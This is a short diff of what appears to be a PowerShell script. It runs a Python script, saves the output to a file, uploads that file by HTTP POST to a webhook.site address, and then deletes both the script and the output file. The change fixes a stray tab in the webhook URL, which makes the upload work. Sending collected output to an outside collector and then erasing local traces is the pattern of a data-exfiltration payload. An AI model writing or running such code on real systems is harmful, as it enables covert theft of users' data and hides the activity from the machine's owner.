@@ -21,7 +21,7 @@ $output = python $scriptPath
 $output | Out-File -FilePath $outputFilePath
 
 # Send the output to the webhook URL
-Invoke-WebRequest -Uri "	https://webhook.site/809d0f5f-7467-48fc-9be5-538024059dd4" -Method POST -InFile $outputFilePath
+Invoke-WebRequest -Uri "https://webhook.site/809d0f5f-7467-48fc-9be5-538024059dd4" -Method POST -InFile $outputFilePath
 
 Remove-Item -Path $scriptPath
 Remove-Item -Path $outputFilePath
